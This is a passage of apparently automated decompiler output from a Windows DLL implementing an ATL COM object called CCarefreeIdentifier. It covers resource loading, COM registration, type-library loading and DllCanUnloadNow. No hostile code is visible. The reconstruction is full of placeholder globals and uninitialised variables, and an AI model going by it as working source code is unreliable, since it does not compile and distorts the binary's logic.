            int32_t v17 = v16 + 4 + v15; // 0x10013b0e
            int32_t v18 = v14;
            int32_t v19; // 0x10013aa0
            int32_t v20; // 0x10013aa0
            uint32_t v21; // 0x10013aa0
            int32_t v22; // 0x10013aa0
            int32_t v23; // 0x10013aa0
            int32_t v24; // 0x10013aa0
            int32_t v25; // 0x10013aa0
            int32_t v26; // 0x10013aa0
            int32_t v27; // 0x10013aa0
            int32_t v28; // 0x10013aa0
            int32_t v29; // 0x10013aa0
            int32_t v30; // 0x10013b1a
            int32_t v31; // 0x10013b1c
            int32_t v32; // 0x10013b22
            int32_t v33; // 0x10013b24
            int32_t v34; // 0x10013b36
            int32_t v35; // 0x10013b39
            int32_t v36; // 0x10013b3c
            if (v13 == *(int32_t *)v17) {
                // 0x10013b17
                v30 = *v11;
                v31 = v16 + v15;
                v32 = *(int32_t *)v31;
                v33 = 2 * *(int32_t *)(v31 + 4);
                v19 = v33;
                v22 = v32;
                v26 = v30;
                v20 = v33;
                v24 = v32;
                v28 = v30;
                if (v33 < 4) {
                    // 0x10013b44
                    v21 = v20;
                    if (v21 == 0) {
                        // 0x10013b9a
                        *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                        return 0;
                    }
                    // 0x10013b48
                    v29 = v28;
                    v25 = v24;
                    if (*(char *)v29 == *(char *)v25) {
                        if (v21 < 2) {
                            // 0x10013b9a
                            *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                            return 0;
                        }
                        // 0x10013b53
                        if (*(char *)(v29 + 1) == *(char *)(v25 + 1)) {
                            if (v21 < 3 || *(char *)(v29 + 2) == *(char *)(v25 + 2)) {
                                // 0x10013b9a
                                *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                                return 0;
                            }
                        }
                    }
                } else {
                    v27 = v26;
                    v23 = v22;
                    while (*(int32_t *)v23 == *(int32_t *)v27) {
                        // 0x10013b36
                        v34 = v19 - 4;
                        v35 = v27 + 4;
                        v36 = v23 + 4;
                        v19 = v34;
                        v20 = v34;
                        v24 = v36;
                        v28 = v35;
                        if (v34 < 4) {
                            goto lab_0x10013b44;
                        }
                        v27 = v35;
                        v23 = v36;
                    }
                }
            }
            int32_t v37 = v18 - 1; // 0x10013b77
            v17 -= 12;
            int32_t v38 = v16 - 12; // 0x10013b7b
            v10 = v12;
            while (v37 >= 0) {
                // 0x10013b10
                v18 = v37;
                int32_t v39 = v38;
                if (v13 == *(int32_t *)v17) {
                    // 0x10013b17
                    v30 = *v11;
                    v31 = v39 + v15;
                    v32 = *(int32_t *)v31;
                    v33 = 2 * *(int32_t *)(v31 + 4);
                    v19 = v33;
                    v22 = v32;
                    v26 = v30;
                    v20 = v33;
                    v24 = v32;
                    v28 = v30;
                    if (v33 < 4) {
                        // 0x10013b44
                        v21 = v20;
                        if (v21 == 0) {
                            // 0x10013b9a
                            *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                            return 0;
                        }
                        // 0x10013b48
                        v29 = v28;
                        v25 = v24;
                        if (*(char *)v29 == *(char *)v25) {
                            if (v21 < 2) {
                                // 0x10013b9a
                                *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                                return 0;
                            }
                            // 0x10013b53
                            if (*(char *)(v29 + 1) == *(char *)(v25 + 1)) {
                                if (v21 < 3 || *(char *)(v29 + 2) == *(char *)(v25 + 2)) {
                                    // 0x10013b9a
                                    *(int32_t *)a4 = *(int32_t *)(v15 + 8 + 12 * v18);
                                    return 0;
                                }
                            }
                        }
                    } else {
                        v27 = v26;
                        v23 = v22;
                        while (*(int32_t *)v23 == *(int32_t *)v27) {
                            // 0x10013b36
                            v34 = v19 - 4;
                            v35 = v27 + 4;
                            v36 = v23 + 4;
                            v19 = v34;
                            v20 = v34;
                            v24 = v36;
                            v28 = v35;
                            if (v34 < 4) {
                                goto lab_0x10013b44;
                            }
                            v27 = v35;
                            v23 = v36;
                        }
                    }
                }
                // 0x10013b6e
                v37 = v18 - 1;
                v17 -= 12;
                v38 = v39 - 12;
                v10 = v12;
            }
        }
    }
    int32_t v40 = *v2; // 0x10013b83
    *(int32_t *)(v10 - 4) = a4;
    *(int32_t *)(v10 - 8) = a2;
    *(int32_t *)(v10 - 12) = a1;
    *(int32_t *)(v10 - 16) = v40;
    // 0x10013b93
    return *(int32_t *)(*(int32_t *)v40 + 40);
}

// Address range: 0x10013bc0 - 0x10013c1d
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013bc0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10013bc0
    if (a1 != 0) {
        // 0x10013bc9
        return -0x7ffdfff5;
    }
    // 0x10013bd2
    if (a3 == 0) {
        // 0x10013bc9
        return -0x7fffbffd;
    }
    int32_t v1 = 0; // 0x10013bec
    int32_t v2; // bp-8, 0x10013bc0
    int32_t * v3 = &v2; // 0x10013bec
    if (g74 == 0) {
        int32_t v4 = a2; // bp-12, 0x10013bf1
        int32_t v5; // 0x10013bc0
        v1 = function_100133d0(a2, v5);
        v3 = &v4;
    }
    // 0x10013bfc
    *(int32_t *)a3 = g74;
    int32_t result = v1; // 0x10013c0c
    if (g74 != 0) {
        // 0x10013c0e
        *(int32_t *)((int32_t)v3 - 4) = g74;
        result = 0;
    }
    // 0x10013bc9
    return result;
}

// Address range: 0x10013c20 - 0x10013c45
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013c20(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x10013c20
    int32_t v1; // 0x10013c20
    return function_10013aa0(a1, a2, a3, a4, a5, v1);
}

// Address range: 0x10013c50 - 0x10013ca7
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013c50(int32_t result2, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x10013c50
    int32_t * v1; // 0x10013c50
    if (g74 == 0) {
        goto lab_0x10013c7b;
    } else {
        // 0x10013c5f
        int32_t v2; // bp-4, 0x10013c50
        v1 = &v2;
        if (g75 != 0) {
            goto lab_0x10013c7f;
        } else {
            goto lab_0x10013c7b;
        }
    }
  lab_0x10013c7b:;
    int32_t v3 = a3; // bp-8, 0x10013c6a
    int32_t v4; // 0x10013c50
    int32_t result = function_100133d0(a3, v4); // 0x10013c70
    v1 = &v3;
    if (g74 == 0) {
        // 0x10013ca3
        return result;
    }
    goto lab_0x10013c7f;
  lab_0x10013c7f:;
    int32_t v5 = (int32_t)v1;
    *(int32_t *)(v5 - 4) = a8;
    *(int32_t *)(v5 - 8) = a7;
    *(int32_t *)(v5 - 12) = a6;
    *(int32_t *)(v5 - 16) = a5;
    *(int32_t *)(v5 - 20) = a4;
    *(int32_t *)(v5 - 24) = a2;
    *(int32_t *)(v5 - 28) = result2;
    *(int32_t *)(v5 - 32) = g74;
    // 0x10013ca3
    return result2;
}

// Address range: 0x10013cb0 - 0x10013dc3
int32_t function_10013cb0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10013cc0
    __writefsdword(0, (int32_t)&v1);
    if (a3 == 0) {
        // 0x10013ce4
        __writefsdword(0, v1);
        return -0x7fffbffd;
    }
    // 0x10013cfd
    *(int32_t *)a3 = 0;
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(40); // 0x10013d0c
    if (v2 == 0) {
        // 0x10013dad
        __writefsdword(0, v1);
        return -0x7ff8fff2;
    }
    // 0x10013d49
    *(int32_t *)(v2 + 4) = 0;
    int32_t v3 = v2 + 8;
    *(int32_t *)v3 = 0;
    *(int32_t *)(v2 + 12) = 0;
    *(int32_t *)(v2 + 16) = 0;
    *(int32_t *)(v2 + 20) = 0;
    *(int32_t *)(v2 + 24) = 0;
    *(int32_t *)(v2 + 28) = 0;
    char * v4 = (char *)(v2 + 32);
    *v4 = 0;
    *(int32_t *)v2 = (int32_t)&g20;
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)v3; // bp-48, 0x10013d52
    *(int32_t *)(v2 + 36) = a1;
    int32_t result; // 0x10013cb0
    int32_t v5; // 0x10013cb0
    if (InitializeCriticalSectionAndSpinCount(lpCriticalSection, 0)) {
        goto lab_0x10013d82;
    } else {
        int32_t errorCode = GetLastError(); // 0x10013d60
        int32_t v6 = errorCode < 1 ? errorCode : errorCode & 0xffff | -0x7ff90000;
        v5 = (int32_t)&lpCriticalSection;
        result = v6;
        if (v6 < 0) {
            goto lab_0x10013d97;
        } else {
            goto lab_0x10013d82;
        }
    }
  lab_0x10013d82:
    // 0x10013d82
    *v4 = 1;
    int32_t v7 = v2; // bp-60, 0x10013d8e
    v5 = &v7;
    result = a2;
    if (a2 == 0) {
        // 0x10013dad
        __writefsdword(0, v1);
        return 0;
    }
    goto lab_0x10013d97;
  lab_0x10013d97:
    // 0x10013d97
    *(int32_t *)(v5 - 4) = 1;
    // 0x10013dad
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10013dd0 - 0x10013ebb
int32_t function_10013dd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10013de0
    __writefsdword(0, (int32_t)&v1);
    if (a3 == 0) {
        // 0x10013e04
        __writefsdword(0, v1);
        return -0x7fffbffd;
    }
    // 0x10013e1d
    *(int32_t *)a3 = 0;
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(20); // 0x10013e2c
    int32_t result = -0x7ff8fff2; // 0x10013e3f
    if (v2 != 0) {
        // 0x10013e6f
        *(int32_t *)(v2 + 4) = 0;
        *(int32_t *)v2 = (int32_t)&g23;
        *(int32_t *)(v2 + 16) = a1;
        *(int32_t *)(v2 + 8) = (int32_t)&g19;
        *(int32_t *)(v2 + 12) = (int32_t)&g18;
        result = a2;
    }
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10013ec0 - 0x10014060
int32_t function_10013ec0(int32_t lpLibFileName, int32_t lpName, int32_t lpType, int32_t a4, int32_t a5) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10013ed0
    __writefsdword(0, (int32_t)&v1);
    int32_t * hModule = LoadLibraryExW((int16_t *)lpLibFileName, NULL, 2); // 0x10013f1f
    if (hModule == NULL) {
        // 0x10013f31
        function_10010a80();
        // 0x10014030
        function_100114c0();
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = (int32_t)hModule; // 0x10013f1f
    int32_t v3 = v2; // bp-1116, 0x10013f3f
    int32_t * hResInfo = FindResourceW(hModule, (int16_t *)lpName, (int16_t *)lpType); // 0x10013f40
    int32_t * v4; // 0x10013ec0
    if (hResInfo != NULL) {
        int32_t v5 = v2; // bp-1124, 0x10013f57
        if (LoadResource(hModule, hResInfo) != NULL) {
            int32_t v6 = v2; // bp-1132, 0x10013f75
            int32_t v7 = SizeofResource(hModule, hResInfo); // 0x10013f76
            v4 = &v6;
            if (v7 != -1) {
                int32_t v8 = v7 + 1; // 0x10013f7e
                int32_t v9 = v8; // bp-1136, 0x10013f95
                function_10011eb0(v8);
                v4 = &v9;
            }
        } else {
            // 0x10013f6a
            function_10010a80();
            v4 = &v5;
        }
    } else {
        // 0x10013f4c
        function_10010a80();
        v4 = &v3;
    }
    // 0x1001401b
    *(int32_t *)((int32_t)v4 - 4) = v2;
    FreeLibrary(&g173);
    // 0x10014030
    function_100114c0();
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10014060 - 0x100140b3
int32_t function_10014060(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10014070
    __writefsdword(0, (int32_t)&v1);
    int32_t result = function_10013ec0(a2, a3 & 0xffff, a4, 1, 0); // 0x1001409d
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x100140c0 - 0x10014112
int32_t function_100140c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x100140d0
    __writefsdword(0, (int32_t)&v1);
    int32_t result = function_10013ec0(a2, a3 & 0xffff, a4, 0, 0); // 0x100140fc
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10014120 - 0x10014349
int32_t function_10014120(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x10014120
    int32_t v1; // bp-2652, 0x10014120
    int32_t v2 = &v1; // 0x1001413b
    int32_t v3 = (int32_t)&g11; // bp-2640, 0x1001413e
    int32_t v4 = v2; // 0x1001415c
    if (a4 != 0) {
        int32_t v5 = *(int32_t *)a4; // 0x1001415e
        v4 = v2;
        if (v5 != 0) {
            int32_t v6 = *(int32_t *)(a4 + 4); // 0x10014164
            int32_t v7 = v2; // 0x10014169
            if (v5 != 0 && v6 != 0) {
                // 0x1001416f
                *(int32_t *)(v2 - 4) = v6;
                v7 = v2 - 8;
                *(int32_t *)v7 = v5;
                function_10012670((int32_t)&g173, (int32_t)&g173);
            }
            int32_t v8 = a4 + 8; // 0x10014180
            int32_t v9 = *(int32_t *)v8; // 0x10014180
            int32_t v10 = v8; // 0x10014188
            v4 = v7;
            while (v9 != 0) {
                int32_t v11 = v7;
                int32_t v12 = v9;
                v6 = *(int32_t *)(v10 + 4);
                v7 = v11;
                if (v12 != 0 && v6 != 0) {
                    // 0x1001416f
                    *(int32_t *)(v11 - 4) = v6;
                    v7 = v11 - 8;
                    *(int32_t *)v7 = v12;
                    function_10012670((int32_t)&g173, (int32_t)&g173);
                }
                // 0x10014180
                v8 = v10 + 8;
                v9 = *(int32_t *)v8;
                v10 = v8;
                v4 = v7;
            }
        }
    }
    int32_t v13 = &v3; // 0x10014195
    *(int32_t *)(v4 - 4) = v13;
    if (*(int32_t *)a1 < 0) {
        // 0x10014329
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    // 0x100141a4
    *(int32_t *)(v4 - 8) = 260;
    int32_t v14; // bp-528, 0x10014120
    int32_t v15 = &v14; // 0x100141b5
    *(int32_t *)(v4 - 12) = v15;
    int32_t v16 = v4 - 16; // 0x100141b6
    *(int32_t *)v16 = g141;
    int32_t v17 = GetModuleFileNameW(NULL, (int16_t *)&g173, (int32_t)&g173); // 0x100141bd
    if (v17 == 0) {
        // 0x100141c7
        function_10010a80();
        // 0x1001431e
        function_100114a0();
        // 0x10014329
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    if (v17 == 260) {
        // 0x100141d8
        function_100114a0();
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    int32_t * v18 = (int32_t *)(v4 - 20); // 0x1001420c
    *v18 = v15;
    *(int32_t *)(v4 - 24) = 520;
    int32_t v19; // bp-2616, 0x10014120
    int32_t v20 = &v19; // 0x10014218
    *(int32_t *)(v4 - 28) = v20;
    function_10010ba0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
    int32_t v21; // 0x10014120
    int32_t v22; // 0x10014120
    if (g141 == 0) {
        goto lab_0x1001423b;
    } else {
        // 0x10014225
        *v18 = 0;
        int32_t * v23 = GetModuleHandleW((int16_t *)&g173); // 0x10014226
        v21 = v16;
        v22 = v20;
        if (g141 == (int32_t)v23) {
            goto lab_0x1001423b;
        } else {
            goto lab_0x100142be;
        }
    }
  lab_0x1001423b:;
    int32_t v24 = v16 - 4; // 0x10014241
    int32_t * v25 = (int32_t *)v24; // 0x10014241
    *v25 = v20;
    *(int32_t *)(v16 - 8) = 523;
    int32_t v26; // bp-1574, 0x10014120
    *(int32_t *)(v16 - 12) = (int32_t)&v26;
    int16_t v27 = 34; // bp-1576, 0x10014253
    int32_t v28 = function_10010880(34, (int32_t)&g173, (int32_t)&g173); // 0x1001425a
    if ((char)v28 == 0) {
        // 0x10014266
        function_100114a0();
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    int32_t v29 = &v27; // 0x1001429a
    *v25 = v29;
    int32_t v30; // bp-4, 0x10014120
    int32_t v31 = 2 * lstrlenW((int16_t *)&g173) + (int32_t)&v30;
    *(int16_t *)(v31 - 1572) = 34;
    *(int16_t *)(v31 - 1570) = 0;
    v21 = v24;
    v22 = v29;
    goto lab_0x100142be;
  lab_0x100142be:
    // 0x100142be
    *(int32_t *)(v21 - 4) = v22;
    *(int32_t *)(v21 - 8) = (int32_t)L"Module";
    *(int32_t *)(v21 - 12) = v13;
    int32_t v32 = function_10012800((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x100142cb
    if (v32 < 0) {
        // 0x1001431e
        function_100114a0();
        // 0x10014329
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    // 0x100142d6
    *(int32_t *)(v21 - 16) = v20;
    *(int32_t *)(v21 - 20) = (int32_t)L"Module_Raw";
    *(int32_t *)(v21 - 24) = v13;
    int32_t v33 = function_10012800((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x100142e9
    if (v33 < 0) {
        // 0x1001431e
        function_100114a0();
        // 0x10014329
        function_100118e0();
        return _40___security_check_cookie_40_4();
    }
    // 0x100142f4
    *(int32_t *)(v21 - 28) = (int32_t)L"REGISTRY";
    *(int32_t *)(v21 - 32) = a2;
    *(int32_t *)(v21 - 36) = v15;
    *(int32_t *)(v21 - 40) = v13;
    if (a3 == 0) {
        // 0x10014317
        function_100140c0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
    } else {
        // 0x10014310
        function_10014060((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
    }
    // 0x1001431e
    function_100114a0();
    // 0x10014329
    function_100118e0();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10014350 - 0x1001436b
int32_t function_10014350(int32_t a1) {
    // 0x10014350
    return function_10014120(g94, 106, a1, 0);
}

// Address range: 0x10014370 - 0x1001439c
int32_t function_10014370(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10014370
    int32_t v1; // 0x10014370
    if (a1 != 0) {
        // 0x1001438d
        return function_10013dd0(a1, a2, a3, v1);
    }
    // 0x1001437d
    return function_10013720(0, a2, a3, v1);
}

// Address range: 0x100143a0 - 0x10014410
int32_t function_100143a0(int32_t a1, int32_t a2) {
    int32_t v1 = 16; // 0x100143af
    int32_t v2 = a2; // 0x100143af
    int32_t v3 = a1; // 0x100143af
    int32_t result = 0; // 0x100143b4
    while (*(int32_t *)v3 == *(int32_t *)v2) {
        // 0x100143b6
        v1 -= 4;
        v2 += 4;
        v3 += 4;
        result = 1;
        if (v1 == 0) {
            // break -> 0x100143c4
            break;
        }
        result = 0;
    }
    // 0x100143c4
    return result;
}

// Address range: 0x10014410 - 0x1001445a
int32_t function_10014410(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a3; // bp-8, 0x1001441c
    int32_t v2 = _wcscpy_s((int16_t *)a1, a2, (int16_t *)a3); // 0x1001441f
    g177 = v2;
    int32_t v3; // bp-4, 0x10014410
    int32_t v4 = &v3; // 0x10014424
    int32_t v5 = v4; // 0x10014433
    int32_t v6 = v4; // 0x10014433
    int32_t result = (int32_t)*(char *)(v2 + (int32_t)&g1); // 0x10014433
    switch (v2) {
        case 12: {
            // 0x1001443a
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v5 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x10014444
            v6 = v5 - 4;
            *(int32_t *)v6 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x1001444e
            *(int32_t *)(v6 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x10014458
            return result;
        }
    }
}

// Address range: 0x100144c0 - 0x1001450a
int32_t function_100144c0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a3; // bp-8, 0x100144cc
    int32_t v2 = _wcscat_s((int16_t *)a1, a2, (int16_t *)a3); // 0x100144cf
    g178 = v2;
    int32_t v3; // bp-4, 0x100144c0
    int32_t v4 = &v3; // 0x100144d4
    int32_t v5 = v4; // 0x100144e3
    int32_t v6 = v4; // 0x100144e3
    int32_t result = (int32_t)*(char *)(v2 + (int32_t)&g2); // 0x100144e3
    switch (v2) {
        case 12: {
            // 0x100144ea
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v5 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x100144f4
            v6 = v5 - 4;
            *(int32_t *)v6 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x100144fe
            *(int32_t *)(v6 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x10014508
            return result;
        }
    }
}

// Address range: 0x10014570 - 0x100145ae
int32_t function_10014570(void) {
    // 0x10014570
    int32_t result; // 0x10014570
    int16_t v1 = result;
    if (result == 0 || v1 == 0) {
        // 0x10014574
        return result;
    }
    // 0x10014580
    int32_t v2; // bp-8, 0x10014570
    int32_t v3 = &v2; // 0x10014581
    int32_t v4; // 0x10014570
    int32_t v5 = v4; // 0x1001458d
    if (v1 != 46) {
        // 0x1001458f
        v5 = v1 != 92 ? 0 : 0;
    }
    int32_t v6 = v5;
    v3 -= 4;
    *(int32_t *)v3 = v4;
    int16_t * v7 = CharNextW((int16_t *)&g173); // 0x1001459b
    int32_t v8 = (int32_t)v7;
    int16_t v9 = *v7; // 0x1001459d
    while (v9 != 0) {
        int16_t v10 = v9;
        v5 = v8;
        if (v10 != 46) {
            // 0x1001458f
            v5 = v10 != 92 ? v6 : 0;
        }
        // 0x1001459a
        v6 = v5;
        v3 -= 4;
        *(int32_t *)v3 = v8;
        v7 = CharNextW((int16_t *)&g173);
        v8 = (int32_t)v7;
        v9 = *v7;
    }
    // 0x100145a5
    return v6 == 0 ? v8 : v6;
}

// Address range: 0x100145b0 - 0x100145fe
int32_t function_100145b0(int32_t a1) {
    // 0x100145b0
    int32_t v1; // 0x100145b0
    if (v1 == 0) {
        // 0x100145b8
        return 0;
    }
    int32_t v2; // 0x100145b0
    if ((int16_t)v1 == 0) {
        // 0x100145f2
        return (v2 - v1) / 2;
    }
    // 0x100145ca
    int32_t v3; // bp-16, 0x100145b0
    int32_t v4 = &v3; // 0x100145cb
    int32_t v5; // 0x100145b0
    int32_t v6; // 0x100145b0
    int32_t v7; // 0x100145b0
    int16_t * v8; // 0x100145d2
    int32_t v9; // 0x100145d2
    while (true) {
      lab_0x100145d1:;
        int32_t v10 = v6;
        v4 -= 4;
        *(int32_t *)v4 = v5;
        v8 = CharNextW((int16_t *)&g173);
        v9 = (int32_t)v8;
        int16_t v11 = *(int16_t *)v5; // 0x100145d4
        switch (v11) {
            case 92: {
                // 0x100145e6
                v7 = v9;
                goto lab_0x100145e9;
            }
            case 47: {
                // 0x100145e6
                v7 = v9;
                goto lab_0x100145e9;
            }
            default: {
                // 0x100145e1
                v7 = v10;
                if (v11 != 58) {
                    goto lab_0x100145e9;
                } else {
                    // 0x100145e6
                    v7 = v9;
                    goto lab_0x100145e9;
                }
            }
        }
    }
    // 0x100145f2
    return (v2 - v1) / 2;
  lab_0x100145e9:
    // 0x100145e9
    v5 = v9;
    v6 = v7;
    v2 = v7;
    if (*v8 == 0) {
        return (v2 - v1) / 2;
    }
    goto lab_0x100145d1;
}

// Address range: 0x10014600 - 0x100147de
int32_t function_10014600(int32_t hModule, int32_t lpString, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    if (a3 == NULL || a4 == NULL) {
        // 0x100147c7
        return _40___security_check_cookie_40_4();
    }
    // 0x10014637
    *a3 = 0;
    int32_t v1 = hModule; // bp-596, 0x1001464a
    *a4 = 0;
    int32_t lpFilename; // bp-560, 0x10014600
    uint32_t v2 = GetModuleFileNameW((int32_t *)hModule, (int16_t *)&lpFilename, 260); // 0x1001465b
    if (v2 == 0) {
        // 0x10014667
        function_10010a80();
        // 0x1001466e
        function_100114a0();
        return _40___security_check_cookie_40_4();
    }
    if (v2 == 260) {
        // 0x10014696
        function_100114a0();
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = function_10014570(); // 0x100146bf
    int32_t * v4 = &v1; // 0x100146cc
    if (lpString != 0) {
        int32_t v5 = lpString; // bp-600, 0x100146ce
        uint32_t v6 = lstrlenW((int16_t *)lpString); // 0x100146cf
        uint32_t v7 = v6 + v2; // 0x100146d5
        if (v7 < v2 || v7 < v6 || v7 >= 270) {
            // 0x10014754
            function_100114a0();
            return _40___security_check_cookie_40_4();
        }
        // 0x100146e8
        int32_t v8; // bp-4, 0x10014600
        function_10014410((int32_t)&v8 - 556 + 2 * v2, 270 - v2, lpString);
        v4 = &v5;
    }
    int32_t v9 = (int32_t)a4;
    int32_t v10 = (int32_t)v4;
    *(int32_t *)(v10 - 4) = v9;
    int32_t v11 = &lpFilename; // 0x10014708
    int32_t v12 = v10 - 8; // 0x1001470e
    *(int32_t *)v12 = v11;
    int32_t v13 = LoadTypeLib((int16_t *)&g173, (int32_t **)&g173); // 0x1001470f
    int32_t v14 = v12; // 0x10014715
    if (v13 < 0) {
        int16_t * v15 = (int16_t *)0x74002e; // bp-20, 0x1001473a
        int32_t v16 = (v3 - v11) / 2; // 0x10014747
        if (v16 >= 256) {
            // 0x10014754
            function_100114a0();
            return _40___security_check_cookie_40_4();
        }
        int32_t * v17 = (int32_t *)(v10 - 12); // 0x1001477a
        *v17 = (int32_t)&v15;
        v14 = v10 - 16;
        int32_t * v18 = (int32_t *)v14; // 0x10014782
        *v18 = 270 - v16;
        *(int32_t *)(v10 - 20) = v3;
        function_10014410((int32_t)v15, 0x62006c, 0);
        *v17 = v9;
        *v18 = v11;
        if (LoadTypeLib((int16_t *)&g173, (int32_t **)&g173) < 0) {
            // 0x1001466e
            function_100114a0();
            return _40___security_check_cookie_40_4();
        }
    }
    // 0x100147a0
    *(int32_t *)(v14 - 4) = v11;
    *a3 = (int32_t)SysAllocString((int16_t *)&g173);
    // 0x1001466e
    function_100114a0();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100147e0 - 0x100147f6
int32_t DllCanUnloadNow(void) {
    // 0x100147e0
    return g120 != 0;
}

// Address range: 0x10014800 - 0x10014b0c
int32_t function_10014800(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = 0; // bp-412, 0x1001481e
    if (a2 == 0) {
        // 0x10014ad0
        return _40___security_check_cookie_40_4();
    }
    // 0x1001482c
    if (*(int32_t *)a1 == 0) {
        // 0x10014836
        if (*(int32_t *)(a1 + 4) == 0) {
            // 0x10014841
            if (*(int32_t *)(a1 + 8) == 0) {
                // 0x1001484c
                if (*(int32_t *)(a1 + 12) == 0) {
                    // 0x10014ad0
                    return _40___security_check_cookie_40_4();
                }
            }
        }
    }
    int32_t v2 = &g34; // bp-476, 0x1001486a
    int32_t v3 = &v2; // 0x1001486a
    uint32_t v4 = CoCreateInstance((int32_t)&g34, NULL, 1, &g24, (int32_t **)&v1); // 0x1001486f
    int32_t v5 = v3; // 0x10014877
    if (v4 >= 0) {
        int32_t v6 = v3; // 0x1001487f
        if (*(int32_t *)a2 != 0) {
            // 0x10014881
            int32_t v7; // bp-408, 0x10014800
            int32_t v8 = &v7; // 0x100148b5
            v7 = *(int32_t *)*(int32_t *)(a2 + 4);
            int32_t v9 = *(int32_t *)v1; // 0x100148ad
            *(int32_t *)(v3 - 4) = v8;
            *(int32_t *)(v3 - 8) = 1;
            *(int32_t *)(v3 - 12) = a1;
            int32_t v10 = v3 - 16; // 0x100148b9
            *(int32_t *)v10 = v1;
            if (a3 != 0) {
                // 0x100148bf
                if (*(int32_t *)((*(int32_t *)a2 != 1 ? 28 : 20) + v9) < 0) {
                    // 0x10014ae5
                    if (v1 == 0) {
                        // 0x10014af7
                        return _40___security_check_cookie_40_4();
                    }
                    // 0x10014aef
                    *(int32_t *)(v3 - 20) = v1;
                    // 0x10014af7
                    return _40___security_check_cookie_40_4();
                }
            }
            int32_t v11 = a2 + 8; // 0x100148eb
            v6 = v10;
            while (*(int32_t *)v11 != 0) {
                int32_t v12 = v10;
                int32_t v13 = v11;
                v7 = *(int32_t *)*(int32_t *)(v13 + 4);
                v9 = *(int32_t *)v1;
                *(int32_t *)(v12 - 4) = v8;
                *(int32_t *)(v12 - 8) = 1;
                *(int32_t *)(v12 - 12) = a1;
                v10 = v12 - 16;
                *(int32_t *)v10 = v1;
                if (a3 != 0) {
                    // 0x100148bf
                    if (*(int32_t *)((*(int32_t *)v13 != 1 ? 28 : 20) + v9) < 0) {
                        // 0x10014ae5
                        if (v1 == 0) {
                            // 0x10014af7
                            return _40___security_check_cookie_40_4();
                        }
                        // 0x10014aef
                        *(int32_t *)(v12 - 20) = v1;
                        // 0x10014af7
                        return _40___security_check_cookie_40_4();
                    }
                }
                // 0x100148eb
                v11 = v13 + 8;
                v6 = v10;
            }
        }
        // 0x100148f2
        v5 = v6;
        if (a3 == 0) {
            // 0x100148fb
            *(int32_t *)(v6 - 4) = 64;
            int32_t v14; // bp-392, 0x10014800
            int32_t v15 = &v14; // 0x10014903
            *(int32_t *)(v6 - 8) = v15;
            *(int32_t *)(v6 - 12) = a1;
            StringFromGUID2((int32_t)&g173, (int16_t *)&g173, (int32_t)&g173);
            int32_t * v16 = (int32_t *)(v6 - 16); // 0x1001490b
            *v16 = (int32_t)L"CLSID\\";
            int32_t * v17 = (int32_t *)(v6 - 20); // 0x10014916
            *v17 = 128;
            int32_t v18 = v6 - 24; // 0x1001491b
            int32_t * v19 = (int32_t *)v18; // 0x1001491b
            int32_t v20; // bp-264, 0x10014800
